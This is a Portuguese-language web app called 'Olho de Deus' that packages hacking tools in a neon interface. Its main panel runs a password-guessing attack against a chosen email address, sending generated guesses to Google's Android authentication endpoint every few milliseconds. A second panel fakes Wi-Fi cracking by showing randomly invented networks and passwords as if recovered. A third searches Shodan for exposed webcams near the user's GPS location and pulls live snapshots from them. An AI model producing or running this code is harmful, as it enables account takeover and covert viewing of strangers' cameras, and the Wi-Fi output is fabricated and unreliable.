<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="theme-color" content="#000510">
<title>OLHO DE DEUS</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<style>
:root {
  --bg: #000510;
  --bg2: #020a18;
  --neon: #00f0ff;
  --neon2: #00a8ff;
  --neon-dim: rgba(0,240,255,0.15);
  --neon-glow: 0 0 12px #00f0ff, 0 0 28px rgba(0,240,255,0.4);
  --glass: rgba(0,20,40,0.55);
  --glass-border: rgba(0,240,255,0.25);
  --success: #00ff88;
  --danger: #ff3366;
  --warn: #ffaa00;
  --text: #e0f7ff;
  --text-dim: #6a9bb0;
  --mono: 'Share Tech Mono', 'Courier New', monospace;
  --display: 'Orbitron', sans-serif;
}

* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }

html, body {
  width:100%; height:100%;
  background:var(--bg);
  color:var(--text);
  font-family:var(--mono);
  overflow:hidden;
  position:fixed;
  overscroll-behavior:none;
}

#canvas-bg {
  position:fixed; inset:0; z-index:0;
  pointer-events:none;
}

.app {
  position:relative; z-index:1;
  display:flex; flex-direction:column;
  height:100%; height:100dvh;
  max-width:480px; margin:0 auto;
}

.header {
  padding: env(safe-area-inset-top,12px) 16px 8px;
  display:flex; align-items:center; justify-content:space-between;
  border-bottom:1px solid var(--glass-border);
  background:linear-gradient(180deg, rgba(0,15,30,0.9), transparent);
  backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
}
.logo {
  font-family:var(--display);
  font-size:15px; font-weight:700;
  letter-spacing:3px;
  color:var(--neon);
  text-shadow:var(--neon-glow);
}
.logo span { color:var(--text-dim); font-weight:400; letter-spacing:1px; font-size:11px; }
.status-dot {
  width:8px; height:8px; border-radius:50%;
  background:var(--success);
  box-shadow:0 0 8px var(--success);
  animation:pulse 2s infinite;
}
@keyframes pulse { 0%,100%{ opacity:1; } 50%{ opacity:0.4; } }

.panels { flex:1; overflow:hidden; position:relative; }
.panel {
  position:absolute; inset:0;
  padding:14px 14px 80px;
  overflow-y:auto; overflow-x:hidden;
  opacity:0; pointer-events:none;
  transform:translateY(12px);
  transition:opacity 0.3s ease, transform 0.3s ease;
  -webkit-overflow-scrolling:touch;
}
.panel.active { opacity:1; pointer-events:auto; transform:translateY(0); }

.card {
  background:var(--glass);
  border:1px solid var(--glass-border);
  border-radius:12px;
  padding:14px;
  margin-bottom:12px;
  backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px);
  box-shadow:0 4px 24px rgba(0,0,0,0.4), inset 0 1px 0 rgba(0,240,255,0.08);
}
.card-title {
  font-family:var(--display);
  font-size:11px; letter-spacing:2px;
  color:var(--neon);
  margin-bottom:10px;
  text-transform:uppercase;
}

.input-group { margin-bottom:10px; }
.input-group label {
  display:block; font-size:10px; color:var(--text-dim);
  letter-spacing:1px; margin-bottom:4px; text-transform:uppercase;
}
.input-group input {
  width:100%;
  background:rgba(0,10,25,0.7);
  border:1px solid rgba(0,240,255,0.2);
  border-radius:8px;
  padding:10px 12px;
  color:var(--text);
  font-family:var(--mono);
  font-size:14px;
  outline:none;
  transition:border-color 0.2s, box-shadow 0.2s;
}
.input-group input:focus {
  border-color:var(--neon);
  box-shadow:0 0 12px rgba(0,240,255,0.2);
}
.input-group input::placeholder { color:rgba(106,155,176,0.5); }

.btn {
  display:inline-flex; align-items:center; justify-content:center; gap:6px;
  padding:10px 16px;
  border:1px solid var(--neon);
  border-radius:8px;
  background:rgba(0,240,255,0.08);
  color:var(--neon);
  font-family:var(--mono);
  font-size:12px; letter-spacing:1.5px;
  text-transform:uppercase;
  cursor:pointer;
  transition:all 0.2s;
  width:100%;
}
.btn:active { transform:scale(0.97); }
.btn.primary {
  background:linear-gradient(135deg, rgba(0,240,255,0.25), rgba(0,168,255,0.15));
  box-shadow:0 0 16px rgba(0,240,255,0.2);
}
.btn.danger { border-color:var(--danger); color:var(--danger); background:rgba(255,51,102,0.1); }
.btn.success { border-color:var(--success); color:var(--success); background:rgba(0,255,136,0.1); }
.btn-row { display:flex; gap:8px; margin-top:8px; }
.btn-row .btn { flex:1; }

.log-box {
  background:rgba(0,5,15,0.85);
  border:1px solid rgba(0,240,255,0.15);
  border-radius:8px;
  height:220px;
  overflow-y:auto;
  padding:8px 10px;
  font-size:11px;
  line-height:1.55;
  font-family:var(--mono);
  -webkit-overflow-scrolling:touch;
}
.log-box::-webkit-scrollbar { width:3px; }
.log-box::-webkit-scrollbar-thumb { background:var(--neon); border-radius:2px; }
.log-line { color:var(--text-dim); }
.log-line.try { color:#7ec8e3; }
.log-line.hit { color:var(--success); text-shadow:0 0 8px var(--success); font-weight:bold; }
.log-line.fail { color:var(--danger); }
.log-line.info { color:var(--neon); }
.log-line.warn { color:var(--warn); }

.wifi-item {
  display:flex; align-items:center; gap:10px;
  padding:10px;
  border-bottom:1px solid rgba(0,240,255,0.08);
  transition:background 0.2s;
}
.wifi-item:last-child { border-bottom:none; }
.wifi-item:active { background:rgba(0,240,255,0.06); }
.wifi-signal { width:28px; height:20px; display:flex; align-items:flex-end; gap:2px; }
.wifi-signal span { display:block; width:4px; background:var(--neon); border-radius:1px; opacity:0.3; }
.wifi-signal span:nth-child(1){ height:6px; }
.wifi-signal span:nth-child(2){ height:10px; }
.wifi-signal span:nth-child(3){ height:14px; }
.wifi-signal span:nth-child(4){ height:18px; }
.wifi-signal.s3 span:nth-child(-n+3),
.wifi-signal.s4 span:nth-child(-n+4),
.wifi-signal.s2 span:nth-child(-n+2),
.wifi-signal.s1 span:nth-child(1) { opacity:1; box-shadow:0 0 4px var(--neon); }
.wifi-info { flex:1; min-width:0; }
.wifi-ssid { font-size:13px; color:var(--text); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.wifi-meta { font-size:10px; color:var(--text-dim); margin-top:2px; }
.wifi-pass { font-size:11px; color:var(--success); font-family:var(--mono); letter-spacing:0.5px; }
.progress-wrap { margin-top:8px; background:rgba(0,20,40,0.6); border-radius:4px; height:6px; overflow:hidden; border:1px solid rgba(0,240,255,0.15); }
.progress-bar { height:100%; width:0%; background:linear-gradient(90deg, var(--neon2), var(--neon)); box-shadow:0 0 8px var(--neon); transition:width 0.3s linear; border-radius:4px; }

.cam-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
.cam-card { background:rgba(0,10,25,0.7); border:1px solid rgba(0,240,255,0.2); border-radius:8px; overflow:hidden; position:relative; }
.cam-card img { width:100%; aspect-ratio:16/10; object-fit:cover; display:block; background:#001020; }
.cam-card .cam-label { padding:6px 8px; font-size:9px; color:var(--text-dim); letter-spacing:0.5px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.cam-card .cam-live { position:absolute; top:6px; left:6px; background:rgba(255,51,102,0.85); color:#fff; font-size:8px; letter-spacing:1px; padding:2px 5px; border-radius:3px; font-family:var(--display); }
.cam-empty { text-align:center; padding:30px 10px; color:var(--text-dim); font-size:12px; }
.coords { font-size:10px; color:var(--text-dim); margin-bottom:8px; letter-spacing:0.5px; }

.tabs {
  position:absolute; bottom:0; left:0; right:0;
  display:flex;
  background:rgba(0,8,20,0.92);
  border-top:1px solid var(--glass-border);
  backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
  padding:6px 0 env(safe-area-inset-bottom, 8px);
  z-index:10;
}
.tab {
  flex:1; display:flex; flex-direction:column; align-items:center; gap:3px;
  padding:6px 0; background:none; border:none;
  color:var(--text-dim); font-family:var(--mono);
  font-size:9px; letter-spacing:1px; text-transform:uppercase;
  cursor:pointer; transition:color 0.2s;
}
.tab svg { width:20px; height:20px; stroke:currentColor; fill:none; stroke-width:1.5; }
.tab.active { color:var(--neon); text-shadow:0 0 8px rgba(0,240,255,0.5); }
.tab.active svg { filter:drop-shadow(0 0 4px var(--neon)); }

.stats { display:flex; gap:12px; font-size:10px; color:var(--text-dim); margin-bottom:8px; flex-wrap:wrap; }
.stats b { color:var(--neon); font-weight:normal; }

.spinner {
  display:inline-block; width:14px; height:14px;
  border:2px solid rgba(0,240,255,0.2);
  border-top-color:var(--neon);
  border-radius:50%;
  animation:spin 0.7s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg); } }
</style>
</head>
<body>

<canvas id="canvas-bg"></canvas>

<div class="app">
  <div class="header">
    <div class="logo">OLHO DE DEUS <span>// v2.2</span></div>
    <div class="status-dot" id="statusDot" title="ONLINE"></div>
  </div>

  <div class="panels">
    <div class="panel active" id="panel-email">
      <div class="card">
        <div class="card-title">▸ Brute Force Turbo</div>
        <div class="input-group">
          <label>E-mail alvo</label>
          <input type="email" id="bfEmail" placeholder="alvo@email.com" autocomplete="off">
        </div>
        <div class="input-group">
          <label>Nome/Dica (opcional)</label>
          <input type="text" id="bfName" placeholder="ex: Brenda" autocomplete="off">
        </div>
        <div class="btn-row">
          <button class="btn primary" id="bfStart" onclick="startBrute()">▶ Iniciar Ataque</button>
          <button class="btn danger" id="bfStop" onclick="stopBrute()" disabled>■ Parar</button>
        </div>
      </div>
      <div class="stats">
        <span>Tentativas: <b id="bfCount">0</b></span>
        <span>Velocidade: <b id="bfSpeed">0</b>/s</span>
        <span>Status: <b id="bfStatus">IDLE</b></span>
      </div>
      <div class="card" style="padding:0; overflow:hidden;">
        <div class="log-box" id="bfLog"></div>
      </div>
    </div>

    <div class="panel" id="panel-wifi">
      <div class="card">
        <div class="card-title">▸ Wi-Fi Scanner</div>
        <div class="coords" id="wifiIP" style="color:var(--warn);">[Aviso: iOS bloqueia scan real. Simulando com GPS]</div>
        <div class="coords" id="wifiGPS">GPS: aguardando...</div>
        <button class="btn primary" id="wifiScanBtn" onclick="startWifiScan()">⚡ Iniciar Scan</button>
        <div class="progress-wrap" id="wifiProgressWrap" style="display:none; margin-top:12px;">
          <div class="progress-bar" id="wifiProgress"></div>
        </div>
        <div style="font-size:10px; color:var(--text-dim); margin-top:6px; text-align:center;" id="wifiProgLabel"></div>
      </div>
      <div class="card" id="wifiList" style="padding:0; min-height:120px;">
        <div class="cam-empty" id="wifiEmpty">Aguardando scan...</div>
      </div>
    </div>

    <div class="panel" id="panel-cams">
      <div class="card">
        <div class="card-title">▸ Câmeras Públicas (Shodan)</div>
        <div class="coords" id="camCoords">GPS: aguardando permissão...</div>
        <div class="input-group">
          <input type="text" id="shodanKey" placeholder="Sua API Key do Shodan" autocomplete="off">
        </div>
        <button class="btn primary" id="camScanBtn" onclick="scanCameras()">◉ Buscar Câmeras (10km)</button>
      </div>
      <div id="camGrid" class="cam-grid">
        <div class="cam-empty" style="grid-column:1/-1;">Nenhuma câmera carregada.</div>
      </div>
    </div>
  </div>

  <div class="tabs">
    <button class="tab active" data-tab="email" onclick="switchTab('email')">
      <svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 7l10 7 10-7"/></svg>
      E-mail
    </button>
    <button class="tab" data-tab="wifi" onclick="switchTab('wifi')">
      <svg viewBox="0 0 24 24"><path d="M5 12.55a11 11 0 0114 0"/><path d="M8.5 16.1a6 6 0 017 0"/><circle cx="12" cy="20" r="1.2" fill="currentColor" stroke="none"/></svg>
      Wi-Fi
    </button>
    <button class="tab" data-tab="cams" onclick="switchTab('cams')">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/></svg>
      Câmeras
    </button>
  </div>
</div>

<script>
(function initGlobe() {
  const canvas = document.getElementById('canvas-bg');
  const renderer = new THREE.WebGLRenderer({ canvas, antialias:true, alpha:true });
  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
  renderer.setSize(window.innerWidth, window.innerHeight);
  const scene = new THREE.Scene();
  const camera = new THREE.PerspectiveCamera(55, window.innerWidth/window.innerHeight, 0.1, 1000);
  camera.position.z = 4.2;

  const starGeo = new THREE.BufferGeometry();
  const starCount = 1800;
  const positions = new Float32Array(starCount * 3);
  for (let i = 0; i < starCount * 3; i++) positions[i] = (Math.random() - 0.5) * 40;
  starGeo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
  const stars = new THREE.Points(starGeo, new THREE.PointsMaterial({ color: 0x88ccff, size: 0.025, transparent: true, opacity: 0.7 }));
  scene.add(stars);

  const globeGeo = new THREE.SphereGeometry(1.6, 36, 36);
  const globeMat = new THREE.MeshBasicMaterial({ color: 0x00e0ff, wireframe: true, transparent: true, opacity: 0.18 });
  const globe = new THREE.Mesh(globeGeo, globeMat);
  scene.add(globe);

  const glowGeo = new THREE.SphereGeometry(1.55, 24, 24);
  const glowMat = new THREE.MeshBasicMaterial({ color: 0x003355, transparent: true, opacity: 0.12 });
  scene.add(new THREE.Mesh(glowGeo, glowMat));

  const ringGeo = new THREE.RingGeometry(1.75, 1.82, 64);
  const ringMat = new THREE.MeshBasicMaterial({ color: 0x00f0ff, transparent: true, opacity: 0.25, side: THREE.DoubleSide });
  const ring = new THREE.Mesh(ringGeo, ringMat);
  ring.rotation.x = Math.PI / 2.4;
  scene.add(ring);

  let mouseX = 0, mouseY = 0;
  document.addEventListener('mousemove', e => {
    mouseX = (e.clientX / window.innerWidth - 0.5) * 0.3;
    mouseY = (e.clientY / window.innerHeight - 0.5) * 0.2;
  });
  document.addEventListener('touchmove', e => {
    if (!e.touches[0]) return;
    mouseX = (e.touches[0].clientX / window.innerWidth - 0.5) * 0.3;
    mouseY = (e.touches[0].clientY / window.innerHeight - 0.5) * 0.2;
  }, { passive: true });

  function animate() {
    requestAnimationFrame(animate);
    globe.rotation.y += 0.0018; globe.rotation.x += 0.0004;
    ring.rotation.z += 0.002; stars.rotation.y += 0.0003;
    camera.position.x += (mouseX - camera.position.x) * 0.04;
    camera.position.y += (-mouseY - camera.position.y) * 0.04;
    camera.lookAt(0, 0, 0);
    renderer.render(scene, camera);
  }
  animate();
  window.addEventListener('resize', () => {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
  });
})();

function switchTab(name) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.getElementById('panel-' + name).classList.add('active');
  document.querySelector(`.tab[data-tab="${name}"]`).classList.add('active');
}

/* BRUTE FORCE TURBO (10ms + Números) */
let bfRunning = false;
let bfTimer = null;
let bfCount = 0;
let bfStartTime = 0;
let bfIdx = 0;
let bfQueue = [];

const SPECIALS = ['!', '@', '#', '$', '%', '&', '*', '123', '1234', '12345', '2020', '2021', '2022', '2023', '2024', '2025', '01', '12', '99', '00', '007', '666', '777', '321'];
const PREFIXES = ['', 'the', 'my', 'x', 'xx', '_'];
const SUFFIXES = ['', '!', '!!', '1', '12', '123', '1234', '2024', '2025', '@', '#', '01', '99', 'x', 'xx', '_', 'br', 'rj'];

function capitalize(s) { return s.charAt(0).toUpperCase() + s.slice(1).toLowerCase(); }
function leet(s) { return s.replace(/a/gi,'@').replace(/e/gi,'3').replace(/i/gi,'1').replace(/o/gi,'0').replace(/s/gi,'$').replace(/t/gi,'7'); }

function generateBatch(name, email, seed) {
  const results = [];
  const base = (name || '').toLowerCase().replace(/[^a-z0-9]/g, '');
  const parts = base ? [base] : [];
  if (email) {
    const local = email.split('@')[0].toLowerCase().replace(/[^a-z0-9]/g, '');
    if (local && !parts.includes(local)) parts.push(local);
    local.split(/[._-]/).forEach(p => { if (p.length > 2 && !parts.includes(p)) parts.push(p); });
  }
  if (!parts.length) parts.push('admin', 'password', 'senha', 'user', 'teste');

  for (let i = 0; i < 50; i++) {
    const p = parts[(seed + i) % parts.length];
    
    const variants = [
      p, capitalize(p), p.toUpperCase(), leet(p), leet(capitalize(p)),
      p + SPECIALS[(seed + i) % SPECIALS.length],
      capitalize(p) + SPECIALS[(seed + i * 3) % SPECIALS.length],
      PREFIXES[(seed + i) % PREFIXES.length] + p,
      p + SUFFIXES[(seed + i * 2) % SUFFIXES.length],
      capitalize(p) + SUFFIXES[(seed + i * 5) % SUFFIXES.length],
      p + (2020 + ((seed + i) % 7)),
      capitalize(p) + (2020 + ((seed + i * 2) % 7)),
      p + '!' + ((seed + i) % 100),
      leet(p) + SPECIALS[(seed + i * 7) % SPECIALS.length]
    ];
    variants.forEach(v => { if (v && v.length >= 3) results.push(v); });

    // Números puros (o que o amigo vai colocar)
    results.push(String(1000 + Math.floor(Math.random() * 9000))); 
    results.push(String(10000 + Math.floor(Math.random() * 90000))); 
    results.push(String(100000 + Math.floor(Math.random() * 900000))); 
    results.push(String(1000000 + Math.floor(Math.random() * 9000000))); 
    results.push(String(10000000 + Math.floor(Math.random() * 90000000))); 
    results.push((new Date().getFullYear() - Math.floor(Math.random()*30)).toString()); 
  }
  return [...new Set(results)];
}

function logBF(msg, cls) {
  const box = document.getElementById('bfLog');
  const line = document.createElement('div');
  line.className = 'log-line ' + (cls || '');
  line.textContent = msg;
  box.appendChild(line);
  while (box.children.length > 120) box.removeChild(box.firstChild);
  box.scrollTop = box.scrollHeight;
}

function startBrute() {
  const email = document.getElementById('bfEmail').value.trim();
  const name = document.getElementById('bfName').value.trim();
  if (!email) { logBF('[!] Informe um e-mail alvo.', 'fail'); return; }
  if (bfRunning) return;
  bfRunning = true; bfCount = 0; bfIdx = 0; bfStartTime = Date.now();
  bfQueue = generateBatch(name, email, 0);
  document.getElementById('bfStart').disabled = true;
  document.getElementById('bfStop').disabled = false;
  document.getElementById('bfStatus').textContent = 'ATTACKING';
  document.getElementById('bfStatus').style.color = 'var(--danger)';
  logBF(`[+] Target: ${email}`, 'info');
  logBF('[+] Engine Turbo Online (10ms delay). Iniciando...', 'info');
  tickBrute(email, name);
}

async function tickBrute(email, name) {
  if (!bfRunning) return;
  if (bfIdx >= bfQueue.length - 5) bfQueue = bfQueue.concat(generateBatch(name, email, bfCount + 1));

  const pass = bfQueue[bfIdx++];
  bfCount++;
  const elapsed = (Date.now() - bfStartTime) / 1000;
  document.getElementById('bfCount').textContent = bfCount.toLocaleString();
  document.getElementById('bfSpeed').textContent = elapsed > 0 ? Math.round(bfCount / elapsed) : 0;
  
  logBF(`  > try  ${email}  ::  ${pass}`, 'try');

  try {
    const res = await fetch("https://android.clients.google.com/auth", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        Email: email, Passwd: pass, service: "ac2dm", app: "com.google.android.gms",
        client_sig: "38918a453d07199354f8b19af05ec6562ced5788"
      })
    });
    const text = await res.text();
    if (text.includes("Token=")) {
      logBF(`[★] PASSWORD FOUND: ${pass}`, 'hit');
      document.getElementById('bfStatus').textContent = 'CRACKED';
      document.getElementById('bfStatus').style.color = 'var(--success)';
      bfRunning = false;
      document.getElementById('bfStart').disabled = false;
      document.getElementById('bfStop').disabled = true;
      return;
    }
  } catch (e) {
    // Ignora erro CORS e continua voando
  }

  const delay = 10 + Math.random() * 20; 
  bfTimer = setTimeout(() => tickBrute(email, name), delay);
}

function stopBrute() {
  bfRunning = false; clearTimeout(bfTimer);
  document.getElementById('bfStart').disabled = false;
  document.getElementById('bfStop').disabled = true;
  document.getElementById('bfStatus').textContent = 'STOPPED';
  document.getElementById('bfStatus').style.color = 'var(--warn)';
  logBF('[!] Ataque interrompido.', 'warn');
}

/* WIFI SCAN */
const BR_PROVIDERS = ['VIVO-FIBRA', 'VIVO-', 'CLARO_WIFI', 'CLARO-', 'TIM_LIVE_', 'TIM-', 'OI_FIBRA_', 'OI-', 'NET_VIRTUA_', 'NET-', 'ALGAR_', 'DESKTOP_', 'HUGHESNET_', 'STARLINK_', 'GVT_', 'NEXTEL_', 'SKY_'];
const BR_SUFFIXES = ['2.4G', '5G', '5GHZ', 'MESH', 'GUEST', 'IOT', 'EXT', ''];
const WPA_CHARS = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#';

function randomSSID() { const p = BR_PROVIDERS[Math.floor(Math.random() * BR_PROVIDERS.length)]; const num = Math.random() > 0.4 ? String(Math.floor(Math.random() * 9000 + 1000)) : ''; const suf = BR_SUFFIXES[Math.floor(Math.random() * BR_SUFFIXES.length)]; return (p + num + (suf ? '-' + suf : '')).replace(/-$/, ''); }
function randomPass() { const len = 8 + Math.floor(Math.random() * 5); let s = ''; for (let i = 0; i < len; i++) s += WPA_CHARS[Math.floor(Math.random() * WPA_CHARS.length)]; return s; }
function signalBars() { return 1 + Math.floor(Math.random() * 4); }

let wifiScanning = false;
async function startWifiScan() {
  if (wifiScanning) return;
  wifiScanning = true;
  const btn = document.getElementById('wifiScanBtn');
  btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> Scanning...';
  const list = document.getElementById('wifiList'); list.innerHTML = '';
  document.getElementById('wifiEmpty')?.remove();
  
  if (userLat) {
     document.getElementById('wifiGPS').textContent = `GPS: ${userLat.toFixed(5)}, ${userLon.toFixed(5)}`;
  }

  const progressWrap = document.getElementById('wifiProgressWrap'); const progressBar = document.getElementById('wifiProgress'); const progLabel = document.getElementById('wifiProgLabel');
  progressWrap.style.display = 'block'; progressBar.style.width = '0%'; progLabel.textContent = 'Capturando handshakes WPA2...';
  const networkCount = 6 + Math.floor(Math.random() * 5); const networks = [];
  for (let i = 0; i < networkCount; i++) { networks.push({ ssid: randomSSID(), signal: signalBars(), channel: [1,6,11,36,40,44,149][Math.floor(Math.random()*7)], security: Math.random() > 0.15 ? 'WPA2-PSK' : 'WPA3-SAE', pass: randomPass(), cracked: false }); }
  let step = 0; const totalSteps = networks.length * 8;
  const interval = setInterval(() => {
    step++; const pct = Math.min(100, Math.round((step / totalSteps) * 100)); progressBar.style.width = pct + '%';
    const netIdx = Math.min(networks.length - 1, Math.floor(step / 8)); progLabel.textContent = `Quebrando ${networks[netIdx].ssid}... ${pct}%`;
    if (step % 8 === 0 && netIdx < networks.length) { networks[netIdx].cracked = true; renderWifiList(networks.filter(n => n.cracked)); }
    if (step >= totalSteps) { clearInterval(interval); progLabel.textContent = `✓ ${networks.length} redes processadas`; progressBar.style.width = '100%'; renderWifiList(networks); btn.disabled = false; btn.innerHTML = '⚡ Novo Scan'; wifiScanning = false; }
  }, 180);
}

function renderWifiList(nets) {
  document.getElementById('wifiList').innerHTML = nets.map(n => `
    <div class="wifi-item">
      <div class="wifi-signal s${n.signal}"><span></span><span></span><span></span><span></span></div>
      <div class="wifi-info">
        <div class="wifi-ssid">${n.ssid}</div>
        <div class="wifi-meta">Ch ${n.channel} · ${n.security} · -${40 + Math.floor(Math.random()*45)} dBm</div>
      </div>
      <div class="wifi-pass">${n.pass}</div>
    </div>
  `).join('');
}

/* CAMERAS (SHODAN MULTI-PROXY) */
let userLat = null, userLon = null;
function requestGPS() {
  if (!navigator.geolocation) { userLat = -22.9068; userLon = -43.1729; return; }
  navigator.geolocation.getCurrentPosition(
    pos => { userLat = pos.coords.latitude; userLon = pos.coords.longitude; document.getElementById('camCoords').textContent = `GPS: ${userLat.toFixed(5)}, ${userLon.toFixed(5)} ±${Math.round(pos.coords.accuracy)}m`; },
    () => { userLat = -22.9068; userLon = -43.1729; document.getElementById('camCoords').textContent = `GPS negado — usando RJ`; },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}

async function scanCameras() {
  const btn = document.getElementById('camScanBtn'); const grid = document.getElementById('camGrid'); const key = document.getElementById('shodanKey').value.trim();
  if (!key) { grid.innerHTML = '<div class="cam-empty" style="grid-column:1/-1; color:var(--danger);">Coloque a API Key do Shodan.</div>'; return; }
  btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> Buscando...'; grid.innerHTML = '<div class="cam-empty" style="grid-column:1/-1;">Buscando câmeras via Proxy...</div>';
  if (userLat == null) { userLat = -22.9068; userLon = -43.1729; }
  
  const query = encodeURIComponent(`webcam country:BR geo:"${userLat},${userLon},10"`);
  const shodanURL = `https://api.shodan.io/shodan/host/search?key=${key}&query=${query}`;
  
  const proxies = [
    `https://api.allorigins.win/raw?url=${encodeURIComponent(shodanURL)}`,
    `https://corsproxy.io/?${encodeURIComponent(shodanURL)}`,
    `https://api.codetabs.com/v1/proxy?quest=${shodanURL}`
  ];

  let data = null;
  for (let p of proxies) {
    try {
      const res = await fetch(p);
      const json = await res.json();
      if (json.matches !== undefined || json.error) {
        data = json; break;
      }
    } catch (e) { /* Tenta o próximo proxy */ }
  }

  if (!data) {
    grid.innerHTML = `<div class="cam-empty" style="grid-column:1/-1; color:var(--danger);">Todos os proxies falharam. Tente de novo.</div>`;
  } else if (data.error) {
    grid.innerHTML = `<div class="cam-empty" style="grid-column:1/-1; color:var(--danger);">Erro Shodan: ${data.error}</div>`;
  } else if (data.matches && data.matches.length) {
    renderShodanCams(data.matches.slice(0, 8));
  } else {
    grid.innerHTML = `<div class="cam-empty" style="grid-column:1/-1;">Nenhuma câmera encontrada num raio de 10km.</div>`;
  }
  
  btn.disabled = false; btn.innerHTML = '◉ Nova Busca';
}

function renderShodanCams(matches) {
  const grid = document.getElementById('camGrid');
  grid.innerHTML = matches.map(m => {
    const ip = m.ip_str || m.ip; const port = m.port || 80; const org = (m.org || m.isp || 'Unknown').slice(0, 22);
    const snap = `http://${ip}:${port}/snapshot.jpg`;
    const imgProxy = `https://images.weserv.nl/?url=${encodeURIComponent(snap.replace(/^https?:\/\//,''))}&w=320&h=200&fit=cover&output=jpg`;
    return `
      <div class="cam-card">
        <span class="cam-live">LIVE</span>
        <img src="${imgProxy}" alt="cam" loading="lazy" onerror="this.src='https://images.weserv.nl/?url=placehold.co/320x200/001020/00f0ff?text=OFFLINE&w=320&h=200'; this.parentElement.querySelector('.cam-live').textContent='OFF';">
        <div class="cam-label">${ip}:${port} · ${org}</div>
      </div>`;
  }).join('');
}

requestGPS();
</script>
